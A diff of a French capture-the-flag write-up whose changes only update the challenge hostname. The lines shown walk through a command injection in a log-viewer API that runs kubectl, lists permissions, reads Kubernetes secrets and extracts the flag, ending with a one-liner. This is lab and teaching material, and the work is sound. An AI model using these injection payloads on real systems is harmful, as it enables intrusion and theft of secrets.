@@ -52,7 +52,7 @@ Encoded: `%3E%2Fdev%2Fnull%202%3E%261%20%7C%7Ctrue%3B%20kubectl%20get%20all%3B%2
 
 Call:
 ```bash
-$ curl -s http://a0b1c2d3.24hiut25.ctfer.io/api/v1/logs?name=%3E%2Fdev%2Fnull%202%3E%261%20%7C%7Ctrue%3B%20kubectl%20get%20all%3B%23 | jq -r '.data'
+$ curl -s http://a0b1c2d3.24hiut2025.ctfer.io/api/v1/logs?name=%3E%2Fdev%2Fnull%202%3E%261%20%7C%7Ctrue%3B%20kubectl%20get%20all%3B%23 | jq -r '.data'
 NAME                                           READY   STATUS    RESTARTS   AGE
 pod/monitoring-dep-8cae9fe2-687777959c-8xz2l   1/1     Running   0          30s
 pod/popacola-merch-179c01e2-5d896ff7d9-7r4h6   1/1     Running   0          30s
@@ -76,7 +76,7 @@ On reconnaît l'environnement que le _log viewer_ nous montrait. Toutefois, nous
 Pour ce faire, on injecte la commande `kubectl auth can-i --list`.
 
 ```bash
-$ curl -s http://a0b1c2d3.24hiut25.ctfer.io/api/v1/logs?name=%3E%2Fdev%2Fnull%202%3E%261%20%7C%7Ctrue%3B%20kubectl%20auth%20can-i%20--list%3B%23 | jq -r ".data"
+$ curl -s http://a0b1c2d3.24hiut2025.ctfer.io/api/v1/logs?name=%3E%2Fdev%2Fnull%202%3E%261%20%7C%7Ctrue%3B%20kubectl%20auth%20can-i%20--list%3B%23 | jq -r ".data"
 Resources                                       Non-Resource URLs                      Resource Names   Verbs
 selfsubjectreviews.authentication.k8s.io        []                                     []               [create]
 selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]
@@ -100,7 +100,7 @@ jobs.batch                                      []                              
 On se rend compte que pour une raison obscure (probablement du debug) on a accès en lecture aux secrets. On va donc les lister avec `kubectl get secret`.
 
 ```bash
-$ curl -s http://a0b1c2d3.24hiut25.ctfer.io/api/v1/logs?name=%3E%2Fdev%2Fnull%202%3E%261%20%7C%7Ctrue%3B%20kubectl%20get%20secret%3B%23 | jq -r ".data"
+$ curl -s http://a0b1c2d3.24hiut2025.ctfer.io/api/v1/logs?name=%3E%2Fdev%2Fnull%202%3E%261%20%7C%7Ctrue%3B%20kubectl%20get%20secret%3B%23 | jq -r ".data"
 NAME            TYPE     DATA   AGE
 flag-2b3b469a   Opaque   2      10m
 ```
@@ -108,7 +108,7 @@ flag-2b3b469a   Opaque   2      10m
 Avec un seul secret, on va aller lire son contenu avec `kubectl describe secret/flag-2b3b469a`.
 
 ```bash
-$ curl -s http://a0b1c2d3.24hiut25.ctfer.io/api/v1/logs?name=%3E%2Fdev%2Fnull%202%3E%261%20%7C%7Ctrue%3B%20kubectl%20describe%20secret%2Fflag-2b3b469a%3B%23 | jq -r ".data"
+$ curl -s http://a0b1c2d3.24hiut2025.ctfer.io/api/v1/logs?name=%3E%2Fdev%2Fnull%202%3E%261%20%7C%7Ctrue%3B%20kubectl%20describe%20secret%2Fflag-2b3b469a%3B%23 | jq -r ".data"
 Name:         flag-2b3b469a
 Namespace:    ns-48e1560f
 Labels:       app.kubernetes.io/component=kubrac
@@ -127,7 +127,7 @@ flag:        66 bytes
 On va aller chercher l'attribut `flag`, qui semble être ce que nous cherchons, avec `kubectl get secret/flag-2b3b469a --template={{.data.flag}}`.
 
 ```bash
-$ curl -s http://a0b1c2d3.24hiut25.ctfer.io/api/v1/logs?name=%3E%2Fdev%2Fnull%202%3E%261%20%7C%7Ctrue%3B%20kubectl%20get%20secret%2Fflag-2b3b469a%20--template%3D%7B%7B.data.flag%7D%7D%3B%23 | jq -r ".data" | base64 -d
+$ curl -s http://a0b1c2d3.24hiut2025.ctfer.io/api/v1/logs?name=%3E%2Fdev%2Fnull%202%3E%261%20%7C%7Ctrue%3B%20kubectl%20get%20secret%2Fflag-2b3b469a%20--template%3D%7B%7B.data.flag%7D%7D%3B%23 | jq -r ".data" | base64 -d
 24hIUT{KubÉ®nétE5 rbã¢ å®3-p¤WÊRFùll BÙt-ÐÂNgë®ouS}
 ```
 
@@ -136,7 +136,7 @@ $ curl -s http://a0b1c2d3.24hiut25.ctfer.io/api/v1/logs?name=%3E%2Fdev%2Fnull%20
 One-liner pour exploit l'injection de command et les permissions trop large du ServiceAccount.
 
 ```bash
-curl -s http://a0b1c2d3.24hiut25.ctfer.io/api/v1/logs?name=%3E%2Fdev%2Fnull%202%3E%261%20%7C%7Ctrue%3B%20kubectl%20get%20%22secret%2F%24(kubectl%20get%20secret%20-o%20jsonpath%3D%27%7B.items%5B*%5D.metadata.name%7D%27)%22%20--template%3D%7B%7B.data.flag%7D%7D%7Cbase64%20-d%3B%23 | jq -r '.data'
+curl -s http://a0b1c2d3.24hiut2025.ctfer.io/api/v1/logs?name=%3E%2Fdev%2Fnull%202%3E%261%20%7C%7Ctrue%3B%20kubectl%20get%20%22secret%2F%24(kubectl%20get%20secret%20-o%20jsonpath%3D%27%7B.items%5B*%5D.metadata.name%7D%27)%22%20--template%3D%7B%7B.data.flag%7D%7D%7Cbase64%20-d%3B%23 | jq -r '.data'
 ```
 
 On peut se faire un petit soft dans son langage favori et faire un alias sur `kubectl` pour directement faire nos calls depuis la CLI.
